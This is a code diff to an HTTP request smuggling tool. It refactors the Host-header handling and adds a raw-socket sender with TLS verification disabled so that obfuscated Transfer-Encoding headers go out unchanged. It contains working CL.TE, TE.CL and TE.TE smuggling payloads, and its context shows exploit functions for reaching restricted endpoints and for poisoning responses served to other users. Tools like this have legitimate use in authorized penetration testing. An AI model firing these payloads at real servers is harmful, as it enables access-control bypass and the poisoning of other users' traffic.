@@ -16,9 +16,12 @@ Usage:
 
 from __future__ import annotations
 
+import socket
+import ssl
 import time
 from dataclasses import dataclass, field
 from typing import Any
+from urllib.parse import urlparse
 
 import requests
 
@@ -54,6 +57,53 @@ class SmugglingDetector:
         self.session = requests.Session()
         self.timeout = 10
 
+    def _host_header(self) -> str:
+        """Host header value (host[:port]), correct for IPv6 and userinfo URLs.
+
+        The old ``url.split("//")[1].split("/")[0]`` leaked credentials
+        (``user:pass@host``) and broke IPv6 literals (``[::1]``).
+        """
+        p = urlparse(self.target_url)
+        host = p.hostname or ""
+        if ":" in host:  # IPv6 literal
+            host = f"[{host}]"
+        return f"{host}:{p.port}" if p.port else host
+
+    def _connect_target(self) -> tuple[str, int, bool]:
+        """Return (host, port, use_tls) for a raw socket connection."""
+        p = urlparse(self.target_url)
+        use_tls = p.scheme == "https"
+        port = p.port or (443 if use_tls else 80)
+        return (p.hostname or "", port, use_tls)
+
+    def _send_raw(self, raw: bytes) -> bytes:
+        """Send raw HTTP bytes over a fresh socket and return the response bytes.
+
+        Needed for TE.TE testing: requests/http.client normalise header names
+        and drop malformed ``Transfer-Encoding`` obfuscations, so the only way
+        to actually transmit them is to write the bytes ourselves.
+        """
+        host, port, use_tls = self._connect_target()
+        sock = socket.create_connection((host, port), timeout=self.timeout)
+        try:
+            if use_tls:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            sock.sendall(raw)
+            chunks: list[bytes] = []
+            while True:
+                data = sock.recv(4096)
+                if not data:
+                    break
+                chunks.append(data)
+                if sum(len(c) for c in chunks) > 65536:
+                    break
+            return b"".join(chunks)
+        finally:
+            sock.close()
+
     def detect(self) -> dict[str, Any]:
         """Run all smuggling detection tests."""
         results: list[SmugglingResult] = []
@@ -87,9 +137,7 @@ class SmugglingDetector:
 
         # Time-based detection: if back-end uses TE, it waits for the chunk terminator
         # The smuggled request never terminates, causing a timeout
-        body = "0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: {}\r\n\r\n".format(
-            self.target_url.split("//")[1].split("/")[0]
-        )
+        body = f"0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: {self._host_header()}\r\n\r\n"
 
         headers = {
             "Content-Length": str(len(body)),
@@ -134,9 +182,7 @@ class SmugglingDetector:
         """TE.CL detection: front-end uses Transfer-Encoding, back-end uses Content-Length."""
         result = SmugglingResult(technique="TE.CL")
 
-        body = "8\r\nSMUGGLED\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(
-            self.target_url.split("//")[1].split("/")[0]
-        )
+        body = f"8\r\nSMUGGLED\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: {self._host_header()}\r\n\r\n"
 
         headers = {
             "Content-Length": str(len(body)),
@@ -180,41 +226,40 @@ class SmugglingDetector:
             "Transfer-Encoding\r\n : chunked",
         ]
 
+        host = self._host_header()
+        body = "0\r\n\r\nGET /smuggled HTTP/1.1\r\nFoo: bar"
+
         for obf in obfuscations:
-            body = "0\r\n\r\n"
-            raw_headers = f"Content-Length: {len(body)}\r\n{obf}\r\n"
+            # Build the request bytes by hand so the obfuscated Transfer-Encoding
+            # header is transmitted verbatim — http.client would normalise or
+            # reject these, silently defeating the test.
+            raw = (
+                f"POST / HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"Content-Length: {len(body)}\r\n"
+                f"{obf}\r\n"
+                f"Connection: close\r\n"
+                f"\r\n"
+                f"{body}"
+            ).encode()
 
             try:
-                import http.client
+                self._send_raw(raw)
 
-                host = self.target_url.split("//")[1].split("/")[0]
-                conn = http.client.HTTPConnection(host, timeout=self.timeout)
-                conn.request(
-                    "POST",
-                    "/",
-                    body=body,
-                    headers=dict(
-                        h.split(": ", 1) for h in raw_headers.strip().split("\r\n") if ": " in h
-                    ),
-                )
-                response = conn.getresponse()
-                response.read()
-                conn.close()
+                # A fresh connection: if the smuggled prefix poisoned the
+                # back-end, the next request is malformed/anomalous.
+                probe = (f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
+                resp = self._send_raw(probe).decode("utf-8", errors="replace")
 
-                # Check if the next request is poisoned
-                conn2 = http.client.HTTPConnection(host, timeout=self.timeout)
-                conn2.request("GET", "/")
-                r2 = conn2.getresponse()
-                body2 = r2.read().decode("utf-8", errors="replace")
-                conn2.close()
-
-                if "smuggled" in body2.lower() or r2.status != 200:
+                status_line = resp.split("\r\n", 1)[0]
+                anomalous = " 400 " in status_line or " 500 " in status_line
+                if "smuggled" in resp.lower() or anomalous:
                     result.vulnerable = True
-                    result.evidence = f"Obfuscation '{obf[:50]}' caused response poisoning"
+                    result.evidence = f"Obfuscation '{obf[:50]}' caused response anomaly"
                     result.details["obfuscation"] = obf
                     return result
 
-            except Exception:
+            except OSError:
                 continue
 
         return result
@@ -228,7 +273,7 @@ class SmugglingDetector:
         smuggled_headers: dict[str, str] | None = None,
     ) -> dict[str, Any]:
         """Exploit CL.TE smuggling to access restricted endpoints."""
-        host = self.target_url.split("//")[1].split("/")[0]
+        host = self._host_header()
 
         smuggled_headers = smuggled_headers or {}
         smuggled_header_str = "".join(f"{k}: {v}\r\n" for k, v in smuggled_headers.items())
@@ -265,7 +310,7 @@ class SmugglingDetector:
         victim_path: str = "/",
     ) -> dict[str, Any]:
         """Exploit CL.TE to store a response that will be served to another user."""
-        host = self.target_url.split("//")[1].split("/")[0]
+        host = self._host_header()
 
         smuggled = f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
 
